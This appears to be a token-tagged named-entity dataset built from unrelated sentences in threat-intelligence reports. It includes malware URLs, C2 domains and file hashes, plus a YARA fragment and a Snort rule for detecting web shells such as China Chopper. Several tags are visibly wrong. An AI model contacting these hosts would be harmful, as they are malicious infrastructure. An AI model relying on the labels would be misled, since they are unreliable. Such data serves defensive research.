hxxp://newsfairprocessing[.]com/imopo99/plugins/rpcapd.exe	B-Indicator
hxxp://necessaries-documentation[.]com/khtergf5541/plugins/rpcapd.exe	B-Indicator

Growing	O
threat	O
to	O
organizations	O
in	O
the	O
Middle	O
East	O

11/12	O

The	O
BlackEnergy	O
APT	O
is	O
a	O
sophisticated	O
threat	O
actor	O
that	O
is	O
known	O
to	O
have	O
used	O
at	O
least	O
one	O
zero	O
day	O
,	O
coupled	O
with	O
destructive	O
tools	O
,	O
and	O
code	O
geared	O
towards	O
attacking	O
ICS	O
systems	O
.	O

It	O
is	O
the	O
ims2	O
directory	O
that	O
is	O
the	O
most	O
active	O
.	O

'	O
_de'\.'code'/	O
$	O
strreplace	O
=	O
'	O
(	O
str_replace	O
(	O
'	O
$	O
md5	O
=	O
'	O
.substr	O
(	O
md5	O
(	O
strrev	O
(	O
'	O
$	O
gzinflate	O
=	O
'	O
gzinflate	O
'	O
$	O
cookie	O
=	O
'	O
_COOKIE	O
'	O
$	O
isset	O
=	O
'	O
isset	O
'	O
condition	O
:	O
(	O
filesize	O
>	O
20KB	O
and	O
filesize	O
<	O
22KB	O
)	O
and	O
#	O
cookie	O
==	O
2	O
and	O
#	O
isset	O
==	O
3	O
and	O
all	O
of	O
them	O

Agni	O
is	O
the	O
Hindu	O
god	O
of	O
fire	O
.	O

2	O
Jan	O
.	O

The	O
below	O
screen	O
shot	O
shows	O
the	O
base64	O
decoded	O
strings	O
associated	O
with	O
the	O
C2	O
communication	O
Below	O
is	O
the	O
description	O
of	O
the	O
decoded	O
strings	O

We	O
encourage	O
Freegate	B-Malware
to	O
follow	O
suit	O
.	O

This	O
macro	O
contains	O
three	O
functions	O
:	O
The	O
first	O
one	O
is	O
executed	O
when	O
the	O
document	O
is	O
opened	O
.	O

alert	O
tcp	O
$	O
EXTERNAL_NET	O
any	O
-	O
>	O
$	O
HTTP_SERVERS	O
$	O
HTTP_PORTS	O
(	O
msg	O
:	O
'	O
China	B-Malware
Chopper	I-Malware
with	O
first	O
Command	O
Detected	O
'	O
;	O
flow	O
:	O
to_server	O
,	O
established	O
;	O
content	O
:	O
'	O
FromBase64String	O
'	O
;	O
content	O
:	O
'	O
z1	O
'	O
;	O
content	O
:	O
'	O
POST	O
'	O
;	O
nocase	O
;	O
http_method	O
;	O
reference	B-Indicator
:	I-Indicator
url	I-Indicator
,	I-Indicator
http://www.fireeye.com/blog/technical/botnet-activities-research/2013/08/	I-Indicator
breaking-down-the-china-chopper-web-shell-part-i.html	O
;	O
classtype	O
:	O
web-application-attack	O
;	O
sid	O
:	O
900000101	O
;	O
)	O

Have	O
a	O
look	O
at	O
the	O
'	O
ad	O
'	O
that	O
was	O
published	O
back	O
in	O
December	O
2014	O
.	O

Filename	O
:	O
main64.dll	O

In	O
this	O
year	O
's	O
campaign	O
,	O
the	O
attackers	O
use	O
an	O
upgraded	O
variant	O
of	O
this	O
malware	O
,	O
still	O
written	O
in	O
C++	O
but	O
wrapped	O
as	O
a	O
self-extracting	O
executable	O
.	O

Of	O
course	O
,	O
we	O
ca	O
n't	O
be	O
certain	O
that	O
these	O
are	O
the	O
real	O
names	O
of	O
the	O
attackers	O
.	O

A	O
few	O
months	O
ago	O
,	O
we	O
discovered	O
and	O
analyzed	O
one	O
of	O
their	O
latest	O
backdoors	O
.	O

We	O
would	O
also	O
like	O
to	O
acknowledge	O
Privacy	O
International	O
for	O
their	O
continued	O
work	O
and	O
graciously	O
provided	O
background	O
information	O
on	O
Gamma	O
International	O
.	O

(	O
102	O
)	O
Beers	O
with	O
Talos	B-System
EP33	B-Version
-	O
Change	O
the	O
Conversation	O
or	O
...	O
Threat	O
Roundup	O
for	O
July	O
6-13	O
Advanced	O
Mobile	O
Malware	O
Campaign	O
in	O
India	O
uses	O
Mal	O
...	O
Vulnerability	O
Spotlight	O
:	O
Computerinsel	O
Photoline	O
M	O
...	O
Vulnerability	O
Spotlight	O
:	O
Multiple	O
Antenna	O
House	O
Vu	O
...	B-Organization
Microsoft	O
Patch	O
Tuesday	O
-	O
July	O
2018	O
Vulnerability	O
Spotlight	O
:	O
Multiple	O

Do	O
n't	O
talk	O
to	O
strangers	O
.	O

To	O
scan	O
a	O
single	O
machine	O
:	O
To	O
scan	O
multiple	O
machines	O
:	O
To	O
automatically	O
attempt	O
a	O
clean	O
operation	O
:	O
To	O
scan	O
a	O
list	O
of	O
machines	O
in	O
a	O
.txt	O
fi	O
le	O
:	O
DETECTION	O
OF	O
AURORA	B-Malware
THREATS	O
WITH	O
DIGITAL	O
DNA	O
FOR	O
EPO	O

of	O
Sample	O
B	O
is	O
as	O
follows	O
:	O

Fake	O
Datasettings	O
SHA256	O
:	O

http://www.codeproject.com/Articles/30815/An-Anti-Reverse-Engineering-Guide	B-Indicator
Clearsky	B-Organization
is	O
a	O
cybersecurity	O
consulting	O
and	O
intelligence	O
company	O
.	O

Cobalt	B-System
Strike1.47	B-System
Relieved	O
multiple	O
Beacon	O
information	O
backlog	O
;	O
had	O
a	O
overall	O
check	O
when	O
dictograph	O
was	O
on	O
.	O

The	O
malware	O
also	O
retrieves	O
instructions	O
from	O
the	O
mail	O
server	O
.	O

First	O
Minsk	O
Ceasefire	O
Minsk	O
II	O
Protocol	O
Collapses	O
signed	O
Targeted	O
intrusions	O
against	O
Ukraine	O
's	O
Ministry	O
of	O
Defense	O
Developer	O
of	O
benign	O
app	O
promoted	O
within	O
Ukrainian	O
military	O
Pro-Russian	O
Hacktivist	O
Group	O
Sprut	O
Emerges	O
Reported	O
testing	O
period	O
for	O
ArtOS	O

In	O
July	O
2011	O
SK	O
Communications	O
became	O
the	O
victim	O
of	O
an	O
attack	O
that	O
resulted	O
in	O
the	O
loss	O
of	O
the	O
personal	O
details	O
of	O
35	O
million	O
users.The	O
users	O
of	O
CyWorld	B-System
and	O
Nate	B-System
,	O
services	O
owned	O
by	O
SK	O
Communications	O
,	O
were	O
affected	O
by	O
this	O
attack	O
.	O

18	O

7/10	B-Version
8/10	B-Version

The	O
means	O
the	O
victim	O
most	O
likely	O
will	O
not	O
notice	O
the	O
theft	O
of	O
the	O
.HWP	O
file	O
.	O

As	O
stated	O
in	O
the	O
blog	O
,	O
the	O
attacks	O
are	O
suspected	O
of	O
originating	O
from	O
the	O
website	O
of	O
the	O
Polish	O
Financial	O
Supervision	O
Authority	O
(	O
knf.gov[.]pl	O
)	O
,	O
shown	O
below	O
:	O
From	O
at	O
least	O
2016-10-07	O
to	O
late	O
January	O
the	O
website	O
code	O
had	O
been	O
modified	O
to	O
cause	O
visitors	O
to	O
download	O
malicious	O
JavaScript	O
files	O
from	O
the	O
following	O
locations	O
:	O

However	O
,	O
when	O
one	O
takes	O
a	O
closer	O
look	O
at	O
the	O
way	O
DarkComet	B-Malware
stores	O
this	O
string	O
,	O
we	O
see	O
that	O
the	O
\r	O
and	O
\n	O
characters	O
are	O
not	O
actually	O
CR	O
(	B-Version
0x0D	O
)	O
and	O
LF	O
(	B-Version
0x0A	O
)	O
bytes	O
.	O

The	O
hashing	O
algorithm	O
is	O
different	O
from	O
the	O
simple	O
XOR/ROL	O
technique	O
Bunny	B-Malware
uses	O
.	O

It	O
uses	O
a	O
COM	O
port	O
for	O
UAC	O
bypass	O
,	O
copying	O
its	O
own	O
DLL	O
to	O
the	O
System32	O
path	O
for	O
DLL	O
hijacking	O
,	O
and	O
the	O
hijacked	O
targets	O
are	O
cliconfg.exe	O
and	O
SearchProtocolHost.exe	O
.	O

ini.php	O
wso	B-Malware
shell+	I-Malware
mail	O
mysql.php	O
wso	O
shell+	O
mail	O
opts.php	O
wso	B-Malware
shell	O
error_	O
log.php	O
wso	B-Malware
shell	O
code29.php	O
web	O
shell	O
proxy87	O
.php	O
web	O
shell	O
theme.php	O
wso	B-Malware
shell	O
sma.php	O
PHPMailer	O
media.php	O
wso	B-Malware
shell	O
f3e3e25a822012	B-Indicator
023c6e81b2067	I-Indicator
11865	I-Indicator
f3e3e25a822012	B-Indicator
023c6e81b2067	I-Indicator
11865	I-Indicator
c7	B-Indicator
647	I-Indicator
0e85b7	I-Indicator
f3	I-Indicator
da46539b40e5c	I-Indicator
5527	I-Indicator
12	I-Indicator
155385cc19e309	B-Indicator
27	I-Indicator
65bcfed034b	I-Indicator
82ccb	I-Indicator
1644af9b6424e	B-Indicator
8f58f39c7	I-Indicator
fa5e7	I-Indicator
6de51	I-Indicator
1644af9b6424e	B-Indicator
8f58f39c7	I-Indicator
fa5e7	I-Indicator
6de51	I-Indicator
2292f5db38506	B-Indicator
8e161ae27	I-Indicator
7	I-Indicator
531	I-Indicator
b2e114	I-Indicator
7	O
ec514bbdc6dd	B-Indicator
8f606f803d39af	I-Indicator
8883f	I-Indicator
7	O
8c31eff38fdb7	B-Indicator
2ea3b1800ea91	I-Indicator
7	I-Indicator
940f	I-Indicator
2016-07	O
-01	O
15:57	O
:38	O
2016-06-12	O
13:35:30	O
2016-06-12	O
12:23:28	O
2016-06-12	O
10:59:39	O
2016-06-12	O
11:10:40	O
2016-06-12	O
14:31:13	O
2017	O
-05-16	O
17	O
:33:02	O
2017	O
-05-19	O
13:53:53	O
2017	O
-04-17	O
15:58:41	O
287	O
86	O
287	O
86	O
36623	O
36636	O
107	O
24	O
107	O
24	O
133104	O
14696	O
17	O
62986	O
In	O
the	O
table	O
above	O
:	O
Web	B-Malware
shell	O
is	O
a	O
script	O
that	O
allows	O
remote	O
administration	O
of	O
the	O
machine	O
.	O

Chafer	O
has	O
also	O
continued	O
to	O
use	O
tools	O
previously	B-Version
associated	O
with	O
the	O
group	O
,	O
including	O
its	O
own	O
custom	O
backdoor	O
Remexi	B-Malware
(	O
Backdoor.Remexi	B-Malware
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2015-110911-3433-99	B-Indicator
)	O
)	O
;	O
the	O
aforementioned	B-Version
PsExec	O
;	O
Mimikatz	O
(	O
Hacktool.Mimikatz	O
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2012-042615-3731-99	B-Indicator
)	O
)	O
,	O
a	O
free	O
tool	O
capable	O
of	O
changing	O
privileges	O
,	O
exporting	O
security	O
certi cates	O
,	O
and	O
recovering	O
Windows	O
passwords	O
in	O
plaintext	O
;	O
Pwdump	O
(	O
Pwdump	O
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2005-032616-0025-99	B-Indicator
)	O
)	O
a	O
tool	O
that	O
is	O
used	O
to	O
grab	O
Windows	O
password	O
hashes	O
from	O
a	O
remote	O
Windows	O
computer	O
;	O
and	O
Plink	O
(	O
PuTTY	O
Link	O
)	O
a	O
command-line	O
utility	O
used	O
to	O
create	O
reverse	O
SSH	O
sessions	O
.	O

Antiy	B-Organization
's	O
engines	O
are	O
embedded	O
in	O
tens	O
of	O
thousands	O
of	O
firewalls	O
and	O
tens	O
of	O
millions	O
of	O
mobile	O
phones	O
all	O
over	O
the	O
world	O
.	O

Figure	O
11	O
.	O

IoT	O
hacks	O
,	O
and	O
operational	O
disruptions	O
.	O

Accenture	B-Organization
is	O
a	O
leading	O
global	O
professional	O
services	O
company	O
,	O
providing	O
a	O
broad	O
range	O
of	O
services	O
and	O
solutions	O
in	O
strategy	O
,	O
consulting	O
,	O
digital	O
,	O
technology	O
and	O
operations	O
.	O

The	O
ZIP	O
archive	O
contains	O
a	O
malicious	O
portable	O
executable	O
(	O
PE	O
)	O
file	O
with	O
embedded	O
HTML	O
application	O
(	O
HTA	O
)	O
.	O

-	O
uploads	O
a	O
file	O
#	O
newdownload	O
?	O

Inception	B-Malware
has	O
an	O
ongoing	O
interest	O
in	O
mobile	O
devices	O
and	O
has	O
previously	B-Version
developed	O
malware	O
to	O
infect	O
Android	O
(	O
Android.Lastacloud	O
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2014-121216-4334-99	B-Indicator
)	O
)	O
,	O
iOS	O
(	O
IOS.Lastaccoud	O
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2014-121216-5858-99	B-Indicator
)	O
)	O
and	O
BlackBerry	O
devices	O
(	O
BBOS.Lastacloud	O
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2014-121913-0103-99	B-Indicator
)	O
)	O
.	O

HASH	B-Indicator
(	O
SHA256	O
)	O
DATE	O
DISPOSITION	O
APT	B-Malware

The	O
first	O
consists	O
of	O
CozyDuke	B-Malware
modules	O
which	O
are	O
DLL	O
files	O
loaded	O
in	O
memory	O
by	O
the	O
main	O
component	O
of	O
CozyDuke	B-Malware
for	O
the	O
purposes	O
of	O
extending	O
CozyDuke	B-Malware
's	O
functionality	O
.	O

Specifically	O
,	O
the	O
attacker	O
can	O
not	O
provide	O
a	O
decryption	O
key	O
and	O
the	O
decryption	O
key	O
can	O
not	O
be	O
typed	O
in	O
the	O
ransom	O
screen	O
,	O
because	O
the	O
generated	O
key	O
contains	O
non-acceptable	O
characters	O
.	O

Use	O
of	O
password	O
protected	O
macro	O
to	O
prevent	B-Version
viewing	O
the	O
code	O
and	O
to	O
make	O
manual	O
analysis	O
harder	O
Use	O
of	O
TextBox	O
within	O
the	O
UserForm	O
to	O
store	O
malicious	O
content	O
to	O
bypass	O
analysis	O
tools	O
Use	O
of	O
legitimate	O
service	O
like	O
Google	O
drive	O
to	O
store	O
the	O
list	O
of	O
back	O
up	O
C2	O
servers	O
to	O
bypass	O
security	O
monitoring	O
and	O
reputation	O
based	O
devices	O
.	O

The	O
code	O
inside	O
the	O
box	O
constructs	O
the	O
main	O
Powershell	B-System
commands	O
and	O
scripts	O
.	O

Each	O
step	O
of	O
each	O
part	O
of	O
the	O
process	O
will	O
be	O
explained	O
in	O
detail	O
in	O
its	O
respective	O
section	O
.	O

If	O
the	O
fraudulent	O
transaction	O
confirmations	O
are	O
printed	O
out	O
,	O
the	O
banking	O
officials	O
can	O
spot	O
an	O
anomaly	O
and	O
then	O
respond	O
appropriately	O
to	O
stop	O
such	O
transactions	O
from	O
happening	O
.	O

4db3801a45802041baa44334303e0498c2640cd5dfd6892545487bf7c8c9219f	B-Indicator
ThreatFire	O
522e5549af01c747329d923110c058b7bb7e112816de64bd7919d7b9194fba5b	B-Indicator
Rising	O
2fd5c42d49f9e0fe2daae5b0f78cf9cfde9bfc7b0ed59fc68e0a79a3b16fe05b	B-Indicator
06e387bb79584cdff3672feadea0bf6f783ce1ddc1fa91962d1b5bcd94e1a308	B-Indicator
f1761a5e3856dceb3e14d4555af92d3d1ac47604841f69fc72328b53ab45ca56	B-Indicator
Kaspersky	O
588730213eb6ace35caadcb651217bfbde3f615d94a9cca41a31ee9fa09b186c	B-Indicator
ZoneAlarm	O
c8e8248940830e9f1dc600c189640e91c40f95caae4f3187fb04427980cdc479	B-Indicator
b3fe0e3a3e3befa152c4237b0f3a96ffaa44a2d7e1aa6d379d3a1ab4659e1676	B-Indicator
AntiVir	O

As	O
of	O
June	O
20	O
,	O
2013	O
,	O
svchost.exe	B-Malware
was	O
only	O
detected	O
by	O
four	O
out	O
of	O
47	O
tested	O
anti-virus	O
programs	O
,	O
while	O
VPN-Pro.exe	B-Malware
was	O
only	O
detected	O
by	O
five	O
out	O
of	O
46	O
.	O

APT28	B-Malware
employs	O
a	O
suite	O
of	O
malware	O
with	O
features	O
indicative	O
of	O
the	O
group	O
's	O
plans	O
for	O
continued	O
operations	O
,	O
as	O
well	O
as	O
the	O
group	O
's	O
access	O
to	O
resources	O
and	O
skilled	O
developers	O
.	O

Four	O
of	O
the	O
16	O
short	O
links	O
were	O
clicked	O
,	O
three	O
by	O
the	O
senior	O
staff	O
members	O
.	O

This	O
image	O
appears	O
purportedly	O
to	O
be	O
of	O
Gilad	O
Shalit	O
in	O
his	O
hostage	O
cell	O
.	O

Higher	O
success	O
rates	O
with	O
less	O
risk	O
of	O
discovery	O
:	O
Due	O
to	O
the	O
minimally	O
required	O
user	O
interaction	O
,	O
users	O
do	O
not	O
get	O
suspicious	O
of	O
the	O
document	O
as	O
easily	O
and	O
therefore	O
do	O
not	O
report	O
the	O
situation	O
to	O
internal	O
security	O
teams	O
.	O

Microsoft	B-Organization
Office	B-System
users	O
should	O
apply	O
the	O
patch	O
from	O
Microsoft	B-Organization
as	O
soon	O
as	O
possible	O
,	O
if	O
they	O
have	O
not	O
already	O
installed	O
it	O
.	O

This	O
technique	O
has	O
also	O
been	O
used	O
by	O
PlugX	B-Malware
before	B-Version
.	O

A	O
few	O
days	O
ago	O
CSIS	O
published	O
details	O
about	O
new	O
Carbanak	B-Malware
samples	O
found	O
in	O
the	O
wild	O
.	O

As	O
part	O
of	O
an	O
ongoing	O
TCIRT	O
focused	O
research	O
and	O
analysis	O
,	O
we	O
have	O
found	O
custom	O
malware	O
being	O
used	O
operationally	O
'	O
in	O
the	O
wild	O
'	O
that	O
may	O
be	O
targeting	O
Indian	O
military	O
and	O
government	O
related	O
entities	O
,	O
as	O
well	O
as	O
other	O
unidentified	O
South	O
Asian	O
targets	O
.	O

The	O
latter	O
may	O
be	O
obscure	O
technical	O
slang	O
or	O
be	O
a	O
misuse	O
signifying	O
a	O
potential	O
false	O
flag	O
.	O

2016	O
.	O

[	O
그림	O
23	O
]	O
안다리엘	O
그룹	O
악성코드의	O
암호화	O
방식	O
안랩	B-Organization
V3	B-Version
제품군에서는	O
안다리엘	O
그룹과	O
관련된	O
악성코드를	O
다음과	O
같은	O
진단명으로	O
탐지하고	O
있다	O
.	O

This	O
is	O
an	O
attack	O
objective	O
not	O
typically	O
seen	O
from	O
cyber-crime	O
groups	O
.	O

The	O
certificate	O
and	O
update	O
naming	O
convention	O
is	O
also	O
designed	O
to	O
trick	O
the	O
user	O
.	O

We	O
discovered	O
some	O
interesting	O
characteristics	O
.	O

As	O
of	O
this	O
publication	O
,	O
dnc.org	O
does	O
not	O
use	O
the	O
Google	O
Apps	O
Gmail	O
email	O
service	O
.	O

Transfers	O
using	O
MT103	O
messages	O
were	O
sent	O
from	O
FEIB	O
to	O
Cambodia	O
,	O
the	O
US	O
and	O
Sri	O
Lanka	O
.	O

The	O
attack	O
is	O
split	O
in	O
two	O
parts	O
:	O
the	O
dropper	O
and	O
backdoor	O
launcher	O
.	O

The	O
Cyber	O
Security	O
Advisors	O
(	O
CSA	O
)	O
program	O
bolsters	O
cybersecurity	O
preparedness	O
,	O
risk	O
mitigation	O
,	O
and	O
incident	O
response	O
capabilities	O
of	O
critical	O
infrastructure	O
entities	O
and	O
more	O
closely	O
aligns	O
them	O
with	O
the	O
Federal	O
Government	O
.	O

The	O
malware	O
scans	O
the	O
computer	O
for	O
files	O
that	O
contain	O
certain	O
keywords	O
.	O

In	O
case	O
the	O
hook	O
was	O
installed	O
,	O
the	O
line	O
is	O
'	O
Started	O
...	O
'	O
,	O
else	O
'	O
LoadLibrary	O
'	O
%	O
path	O
to	O
its	O
file	O
%	O
'	O
failed	O
,	O
%	O
error	O
code	O
%	O
'	O
.	O

Mshta.exe	O
is	O
often	O
used	O
by	O
malware	O
to	O
run	O
VBscript	O
for	O
malicious	O
purposes	O
,	O
but	O
using	O
it	O
for	O
downloading	O
a	O
general	O
purpose	O
payload	O
is	O
not	O
so	O
common	O
.	O

MESG_SENDER_SWIFT_ADDRESS	O
from	O
that	O
same	O
message	O
by	O
looking	O
for	O
the	O
following	O
hard	O
coded	O
strings	O
:	O

File	O
name	O
SHA-1	O

They	O
could	O
also	O
be	O
security	O
researchers	O
or	O
vendors	O
who	O
are	O
trying	O
to	O
get	O
information	O
from	O
VirusTotal	O
.	O

E7E05001A294EBFE8A012DD3BCE78E96	B-Indicator
may2008.dyndns.biz	B-Indicator

The	O
additional	O
key	O
logger	O
module	O
is	O
not	O
very	O
complex	O
--	O
it	O
simply	O
intercepts	O
keystrokes	O
and	O
writes	O
typed	O
keys	O
into	O
C	O
:	O
Program	O
FilesCommon	O
FilesSystemOle	O
DBmsolui80.inc	O
,	O
and	O
also	O
records	O
the	O
active	O
window	O
name	O
where	O
the	O
user	O
pressed	O
keys	O
.	O

You	O
can	O
also	O
select	O
a	O
host	O
and	O
type	O
help	O
for	O
a	O
full	O
list	O
of	O
commands	O
.	O

This	O
section	O
of	O
code	O
crashes	O
the	O
popular	O
debugger	O
,	O
OllyDbg	O
.	O

All	O
rights	O
reserved	O
.	O

A	O
DataStore	O
is	O
a	O
map	O
from	O
string	O
keys	O
to	O
values	O
of	O
8	O
possible	O
types	O
,	O
such	O
as	O
integers	O
or	O
strings	O
.	O

Figure	O
10	O
–	O
List	O
of	O
target	O
file	O
extensions	O
from	O
Diskcoder.C	O
.	O

The	O
adversary	O
then	O
used	O
this	O
profile	O
information	O
,	O
in	O
conjunction	O
with	O
the	O
name	O
'	O
Pravyy	O
Sector	O
,	O
'	O
to	O
make	O
it	O
appear	O
as	O
though	O
the	O
extortion	O
threats	O
against	O
the	O
Polish	O
government	O
were	O
originating	O
from	O
an	O
ultranationalist	O
Ukrainian	O
group	O
.	O

Meta	O
Refresh	O
Page	O

This	O
story	O
is	O
about	O
one	O
of	O
those	O
cases	O
.	O

The	O
main	O
functions	O
of	O
the	O
backdoor	O
infoClient	O
fills	O
up	O
the	O
variables	O
in	O
HandlePP	O
class	O
.	O

This	O
attacker	O
put	O
significant	O
effort	O
into	O
deleting	O
evidence	O
of	O
their	O
activities	O
,	O
subverting	O
normal	O
business	O
processes	O
to	O
remain	O
undetected	O
and	O
hampering	O
the	O
response	O
from	O
the	O
victim	O
.	O

Media	O
Grabbing	O

In	O
this	O
case	O
,	O
it	O
appears	O
the	O
actor	O
used	O
the	O
ID	O
field	O
to	O
record	O
the	O
type	O
of	O
attack	O
delivered	O
(	O
docx	O
)	O
and	O
the	O

Ability	O
to	O
receive	O
PowerShell	O
script	O
from	O
the	O
C2	O
server	O
and	O
execute	O
on	O
the	O
machine	O
.	O

Found	O
in	O
Israel	O
Word	O
document	O
,	O
contained	O
in	O
SFX	O
RAR	O
file	O
72fd6074915f8f123eb44b3dd475d36b	B-Indicator

With	O
a	O
network	O
defense	O
strategy	O
of	O
pursuit	O
and	O
deterrence	O
in	O
mind	O
,	O
root9B	O
operators	O
conduct	O
Active	O
Adversary	O
Pursuit	O
(	O
HUNT	O
)	O
operations	O
as	O
a	O
tailored	O
solution	O
for	O
cyber	O
security	O
teams	O
.	O

The	O
spear	O
phishing	O
emails	O
and	O
attached	O
malicious	O
macro	O
documents	O
typically	O
have	O
geopolitical	O
themes	O
.	O

quickly	O
lost	O
interest	O
and	O
stopped	O
replying	O
to	O
him	O
altogether	O
.	O

This	O
server	O
was	O
also	O
located	O
in	O
the	O
Guangdong	O
Province	O
and	O
operated	O
by	O
CHINANET	O
.	O

The	O
website	O
also	O
hosted	O
this	O
malware	O
:	O
afd5288d9aeb0c3ef7b37becb7ed4d5c	B-Indicator
.	O

exploits	O
eyjafjallajoekull	O
fake	O
alert	O
firefox	O

short	O
module_id	O
;	O

SHA1	O
SHA256	O
1c076413cca929b7004863f1a3992afda665786d6e179b9886ddeb8062194049	B-Indicator
1f4d22e5131a66aa24f44eb0d4f1b54d	B-Indicator
2c8a144331ec124755413f31a83e21015c74f2ec	B-Indicator

Exhibit	O
6	O
:	O
Message	O
box	O
with	O
a	O
taunting	O
message	O
Exhibit	O
7	O
:	O
Message	O
box	O
with	O
another	O
taunting	O
message	O

Then	O
,	O
the	O
attackers	O
sent	O
a	O
link	O
to	O
the	O
victims	O
,	O
that	O
led	O
to	O
a	O
phishing	O
website	O
,	O
which	O
hosted	O
a	O
downloadable	O
and	O
malicious	O
version	O
of	O
the	O
Kik	B-Malware
Messenger	I-Malware
app	O
.	O

Babar	B-Malware
,	O
an	O
espionage	O
platform	O
,	O
also	O
analyzed	O
by	O
Marion	O
Marschalek	O

@	O
!	O
#	O
'	O
string	O
is	O
maintained	O
across	O
all	O
known	O
samples	O
and	O
is	O
used	O
to	O
generate	O
RC4	O
keys	O
.	O

Other	O
groups	O
that	O
are	O
more	O
nervous	O
about	O
exposure	O
go	O
in	O
a	O
hibernation	O
mode	O
for	O
months	O
or	O
years	O
.	O

8AEAA0C81A36449EC9613CA846E196F2	B-Indicator
menu.dyndns.biz	B-Indicator

There	O
is	O
no	O
clear-cut	O
answer	O
here	O
.	O

Unlike	O
most	O
Flash	B-Malware
exploits	O
delivered	O
with	O
Microsoft	O
Office	O
,	O
this	O
document	O
uses	O
a	O
lesser-known	O
feature	O
to	O
remotely	O
include	O
all	O
SWF	O
content	O
from	O
the	O
attacker	O
's	O
server	O
instead	O
of	O
embedding	O
it	O
directly	O
in	O
the	O
document	O
.	O

While	O
sending	O
to	O
the	O
C2	O
server	O
,	O
the	O
data	O
is	O
formatted	O
as	O
follows	O
:	O
@	O
{	O
SYSINFO	O
=	O
$	O
get	O
.	O

Based	O
on	O
our	O
observations	O
we	O
propose	O
one	O
or	O
more	O
of	O
the	O
following	O
possible	O
explanations	O
:	O
1	O
.	O

Figure	O
14	O
Comparison	O
of	O
Module	O
1	O

Payment	B-Malware
details.jar	I-Malware

Attackers	O
typically	O
embed	O
a	O
Flash	O
file	O
within	O
a	O
document	O
,	O
which	O
may	O
contain	O
the	O
entire	O
exploit	O
,	O
or	O
may	O
stage	O
the	O
attack	O
to	O
download	O
exploits	O
and	O
payloads	O
more	O
selectively	O
(	O
e.g.	O
APT28/Sofacy	O
DealersChoice	B-Malware
)	O
.	O

Note	O
that	O
the	O
domain	O
being	O
impersonated	O
is	O
that	O
of	O
Israel	O
Electric	O
Company	O
's	O
website	O
(	O
iec.co.il	B-Indicator
)	O
.	O

McAfee	B-Organization
SiteAdvisor	B-System
,	O
SiteAdvisor	O
Plus	O
,	O
SiteAdvisor	O
Enterprise.TrustedSource	O
has	O
coverage	O
for	O
domains	O
and	O
IP	O
addresses	O
that	O
the	O
malware	O
contacts	O
.	O

The	O
malicious	O
.DLL	B-Malware
(	O
also	O
named	O
)	O
is	O
loaded	O
instead	O
of	O
the	O
legitimate	O
copy	O
.	O

Once	O
it	O
downloads	O
the	O
updated	O
executable	O
then	O
the	O
malware	O
creates	O
a	O
value	O
in	O
the	O
Run	O
registry	O
key	O
for	O
persistence	O
,	O
before	O
that	O
it	O
deletes	O
the	O
old	O
entry	O
and	O
adds	O
the	O
new	O
entry	O
so	O
that	O
next	O
time	O
when	O
the	O
system	O
starts	O
the	O
updated	O
executable	O
will	O
run	O
.	O

The	O
analysts	O
and	O
tools	O
that	O
enabled	O
this	O
to	O
happen	O
are	O
unique	O
and	O
proprietary	O
.	O

Ensure	O
error	O
messages	O
are	O
generic	O
and	O
do	O
not	O
expose	O
too	O
much	O
information	O
.	O

S	O
:	O
KeepAlive	O
|	O
27120274	O

The	O
tools	O
are	O
highly	O
configurable	O
and	O
given	O
the	O
correct	O
access	O
could	O
feasibly	O
be	O
used	O
for	O
similar	O
attacks	O
in	O
the	O
future	O
.	O

It	O
seems	O
to	O
be	O
based	O
on	O
SHA-1	O
,	O
but	O
generates	O
32-bit	O
hashes	O
instead	O
of	O
the	O
standard	O
160-bit	O
length	O
.	O

The	O
PlugX	O
sample	O
connects	O
to	O
the	O
blog	O
and	O
parses	O
the	O
page	O
for	O
a	O
command	O
for	O
where	O
to	O
connect	O
to	O
next	O
.	O

After	O
connecting	O
,	O
China	B-Malware
Chopper	I-Malware
also	O
provides	O
useful	O
SQL	O
commands	O
.	O

Ok	O
,	O
we	O
admit	O
that	O
the	O
German	O
word	O
'	O
Kraftfahrzeughaftpflichtversicherung	O
'	O
(	O
36	O
)	O
would	O
not	O
be	O
harmed	O
when	O
copied	O
,	O
but	O
what	O
about	O
'	O
Bundesausbildungsfoerderungsgesetz	O
'	O
(	O
34	O
)	O
or	O
'	O
radioimmunoelectrophoresis	O
'	O
(	O
27	O
)	O
?	O

2014-05-21	B-Version

Hashes	O
detected	O
as	O
part	O
of	O
the	O
BKDR_ANEL	B-Malware
Family	O
:	O

The	O
Sejong	O
Institute	O

Sample	O
:	O
1be9c68b31247357328596a388010c9cfffadcb6e9841fb22de8b0dc2d161c42	B-Indicator
(	O
Note	O
:	O
At	O
the	O
time	O
of	O
this	O
report	O
,	O
the	O
C2	O
for	O
the	O
sample	O
was	O
active	O
and	O
the	O
malware	O
could	O
still	O
establish	O
an	O
active	O
connection	O
to	O
the	O
Ghost	O
Dragon	O
controller	O
at	O
bbs.winupdate[.]net	B-Indicator
.	O

This	O
shows	O
a	O
GET	O
request	O
made	O
to	O
:	O

However	O
,	O
at	O
the	O
same	O
time	O
,	O
the	O
threat	O
actors	O
behind	O
Operation	O
Cobalt	O
Kitty	O
left	O
enough	O
'	O
behavioral	O
fingerprints	O
'	O
to	O
suspect	O
the	O
involvement	O
of	O

However	O
,	O
the	O
application	O
does	O
not	O
do	O
anything	O
.	O

'	O
WADA	O
Confirms	O
Attack	O
by	O
Russian	O
Cyber	O
Espionage	O
Group	O
.	O
'	O

01197697e554021af1ce7e980a5950a5fcf88318	B-Indicator

The	O
malware	O
package	O
used	O
with	O
Aurora	B-Malware
is	O
mature	O
and	O
been	O
in	O
development	O
since	O
at	O
least	O
2006	O
.	O

Looking	O
at	O
whether	O
any	O
other	O
domains	O
or	O
IP	O
addresses	O
were	O
observed	O
delivering	O
malicious	O
software	O
via	O
gokbayrak.com	B-Indicator
shows	O
that	O
it	O
was	O
also	O
observed	O
delivering	O
malware	O
via	O
88.80.190[.]133	B-Indicator
.	O

At	O
the	O
time	O
of	O
this	O
post	O
,	O
the	O
domain	O
is	O
hosted	O
on	O
the	O
Japanese	O
IP	O
address	O
210.253.101.105.7506	B-Indicator
|	O
210.253.96.0/20	B-Indicator
|	O
INTERQ	O
|	O
JP	O
|	O
GMO.JP	O
|	O
GMO	O
INTERNET	O
INC	O
.	O

The	O
controller	O
downloads	O
the	O
victim	O
profiles	O
from	O
the	O
server	O
.	O

5	O
.	O
